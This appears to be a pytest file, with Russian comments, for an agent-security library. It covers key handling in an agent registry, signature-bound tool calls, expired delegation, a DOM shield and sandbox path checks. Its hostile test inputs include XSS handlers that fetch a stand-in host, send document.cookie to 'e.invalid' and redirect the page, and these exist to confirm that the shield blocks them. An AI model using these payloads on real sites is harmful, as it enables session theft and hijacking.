# -*- coding: utf-8 -*-
"""27.11.2026 — проверка двух доработок к коммитам ad6901e/b3e42fc.

1. Реестр агентов: закрытый ключ отдаётся владельцу один раз, агент доказывает владение подписью,
   подпись привязана к DID и инструменту; с истёкшим сроком делегировать нельзя.
2. DOM-щит: блокирует только враждебные inline-обработчики; обычный onerror/onload страницу не блокирует.
"""
from __future__ import annotations

import base64
import time
from pathlib import Path

from cryptography.hazmat.primitives import serialization

from padam.memory import Memory
from padam.store import Store
from padam.shield import (
    inspect_dom_html,
    record_agent_delegation,
    register_agent_identity,
    verify_agent_identity_action,
)


def _mem(tmp_path: Path) -> Memory:
    return Memory(user_id="owner", store=Store(str(tmp_path / "reg.db")))


def _sign(priv_pem: str, msg: str) -> str:
    key = serialization.load_pem_private_key(priv_pem.encode("ascii"), password=None)
    return base64.b64encode(key.sign(msg.encode("utf-8"))).decode("ascii")


def test_private_key_returned_once_and_not_stored(tmp_path: Path) -> None:
    m = _mem(tmp_path)
    try:
        ag = register_agent_identity(m, agent_name="lead", owner_id="owner", allowed_tools=["read_file"])
        _pem_head = "-----BEGIN " + "PRIVATE KEY-----"  # разрезано: сторож секретов перед пушем
        assert ag["private_key_pem"].startswith(_pem_head)
        with m.store._lock:
            cols = [r[1] for r in m.store.conn.execute("PRAGMA table_info(shield_agent_registry)").fetchall()]
            dump = " ".join(str(v) for row in m.store.conn.execute("SELECT * FROM shield_agent_registry").fetchall() for v in row)
        assert not any("private" in c for c in cols)
        assert ("PRIVATE" + " KEY") not in dump
    finally:
        m.store.conn.close()


def test_signature_binds_did_and_tool(tmp_path: Path) -> None:
    m = _mem(tmp_path)
    try:
        ag = register_agent_identity(m, agent_name="lead", owner_id="owner", allowed_tools=["read_file", "send_mail"])
        did, pk = ag["agent_did"], ag["private_key_pem"]
        msg = f"{did}|read_file|n-1"
        ok = verify_agent_identity_action(m, agent_did=did, tool_name="read_file", signature_b64=_sign(pk, msg), signed_message=msg)
        assert ok["allowed"] is True
        # Без подписи при обязательной подписи — отказ
        no = verify_agent_identity_action(m, agent_did=did, tool_name="read_file", require_signature=True)
        assert no["blocked"] and no["rule_id"] == "REGISTRY-SIGNATURE-INVALID"
        # Подпись от read_file не годится для send_mail
        other = verify_agent_identity_action(m, agent_did=did, tool_name="send_mail", signature_b64=_sign(pk, msg), signed_message=msg)
        assert other["blocked"] and other["rule_id"] == "REGISTRY-SIGNATURE-INVALID"
        # Чужой ключ не подходит
        stranger = register_agent_identity(m, agent_name="x", owner_id="owner", allowed_tools=["read_file"])
        forged = verify_agent_identity_action(m, agent_did=did, tool_name="read_file", signature_b64=_sign(stranger["private_key_pem"], msg), signed_message=msg)
        assert forged["blocked"] and forged["rule_id"] == "REGISTRY-SIGNATURE-INVALID"
        # Мусор вместо подписи — отказ без исключения
        junk = verify_agent_identity_action(m, agent_did=did, tool_name="read_file", signature_b64="@@@", signed_message=msg)
        assert junk["blocked"]
        # Прежний вызов без подписи по-прежнему работает (обратная совместимость)
        assert verify_agent_identity_action(m, agent_did=did, tool_name="read_file")["allowed"] is True
    finally:
        m.store.conn.close()


def test_expired_agent_cannot_delegate(tmp_path: Path) -> None:
    m = _mem(tmp_path)
    try:
        lead = register_agent_identity(m, agent_name="lead", owner_id="owner", allowed_tools=["read_file"], ttl_seconds=60)
        sub = register_agent_identity(m, agent_name="sub", owner_id="owner")
        with m.store._lock:
            m.store.conn.execute("UPDATE shield_agent_registry SET expires_at = ? WHERE agent_did = ?", (time.time() - 5, lead["agent_did"]))
            m.store.conn.commit()
        r = record_agent_delegation(m, from_agent_did=lead["agent_did"], to_agent_did=sub["agent_did"], tools=["read_file"])
        assert r["blocked"] and r["rule_id"] == "REGISTRY-DELEGATION-EXPIRED"
    finally:
        m.store.conn.close()


def test_benign_inline_handlers_do_not_block_page() -> None:
    benign = [
        "<img src='a.png' onerror=\"this.style.display='none'\"><p>Hello</p>",
        "<body onload=\"init()\"><p>Welcome</p></body>",
        "<img src='a.png' onerror=\"this.onerror=null;this.src='fallback.png'\">",
    ]
    for h in benign:
        r = inspect_dom_html(h)
        assert r["blocked"] is False, h


def test_hostile_inline_handlers_still_block() -> None:
    hostile = [
        "<svg onload='fetch(\"https://evil.invalid\")'></svg>",
        "<img src=x onerror='alert(1)'>",
        "<img src=x onerror=\"new Image().src='//e.invalid/?c='+document.cookie\">",
        "<body onpageshow=\"location='https://e.invalid'\"></body>",
        "<img src=x onerror=\"\\x61lert(1)\">",
    ]
    for h in hostile:
        r = inspect_dom_html(h)
        assert r["blocked"] is True, h


def test_sandbox_blocks_drive_path_like_on_linux(tmp_path: Path, monkeypatch) -> None:
    """CI 9d0914d падал на Linux/macOS: «C:\…» там не абсолютный путь и проходил как имя файла."""
    import os
    import sys
    import types

    import pytest

    import padam.shield.sandbox as sbm

    sb = sbm.MicroSandbox(tmp_path, read_only=True, allow_network=False, timeout_s=5.0)
    fake = types.SimpleNamespace(**{k: getattr(os, k) for k in dir(os) if not k.startswith("__")})
    fake.name = "posix"
    monkeypatch.setattr(sbm, "os", fake)
    for bad in (r"--file=C:\Windows\win.ini", "C:/Users/x/secret.txt"):
        with pytest.raises(PermissionError):
            sb.validate_command([sys.executable, bad])
    sb.validate_command([sys.executable, "notes.txt", "--mode=fast"])
